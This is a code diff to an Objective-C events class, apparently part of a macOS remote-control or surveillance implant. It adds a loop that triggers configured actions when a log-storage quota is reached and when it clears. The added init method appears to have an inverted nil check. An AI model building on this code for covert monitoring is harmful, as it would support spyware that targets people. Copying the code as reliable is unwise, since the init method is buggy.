@@ -57,6 +57,8 @@ NSLock *connectionLock;
 
 @implementation RCSMEvents
 
+@synthesize mEventQuotaRunning;
+
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
@@ -121,6 +123,26 @@ NSLock *connectionLock;
 - (id)autorelease
 {
   return self;
+}
+
+- (id)init
+{
+  Class myClass = [self class];
+  
+  @synchronized(myClass)
+  {
+    if (sharedEvents != nil)
+      {
+        self = [super init];
+    
+        if (self != nil)
+          {
+            mEventQuotaRunning = NO;
+            sharedEvents = self;
+          }
+      }
+  }
+  return sharedEvents;
 }
 
 #pragma mark -
@@ -1018,6 +1040,12 @@ NSLock *connectionLock;
     }
 }
 
+typedef struct {
+  UInt32 disk_quota;
+  UInt32 tag;
+  UInt32 exit_event;
+} quota_conf_entry_t;
+
 - (void)eventQuota: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -1028,20 +1056,31 @@ NSLock *connectionLock;
 
   [configuration retain];
   
+  quota_conf_entry_t *params = (quota_conf_entry_t*)[[configuration objectForKey: @"data"] bytes];
+  
+  int exitAction = params->exit_event;
+  int enterAction = [[configuration objectForKey: @"actionID"] intValue];
+  
   // Setting parameter
   [[RCSMDiskQuota sharedInstance] setEventQuotaParam:configuration 
                                            andAction:[configuration objectForKey:@"actionID"]];
-                                  
-  // Start to handle quota notification
-  [[NSNotificationCenter defaultCenter] addObserver:self 
-                                           selector:@selector(eventQuotaNotificationCallback:) 
-                                               name:RCSMaxLogQuotaReached 
-                                             object:nil];
-  
+                                           
   while ([configuration objectForKey: @"status"] != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
-      usleep(500000);
+      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
+        {
+          mEventQuotaRunning = YES;
+          [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+        }
+        
+      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
+        {
+          mEventQuotaRunning = NO;
+          [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
+        }
+        
+      usleep(300000);
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
@@ -1049,13 +1088,7 @@ NSLock *connectionLock;
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
       [configuration release];
       
-      // Stop to handle quota notification 
-      // and reset the event quota conf param
-      [[NSNotificationCenter defaultCenter] removeObserver:self 
-                                                      name:RCSMaxLogQuotaReached 
-                                                    object:nil];
-      
-      [[RCSMDiskQuota sharedInstance] resetEventQuotaParam];
+      mEventQuotaRunning = NO;
       
 #ifdef DEBUG_EVENTS
       infoLog(@"event quota stopped");
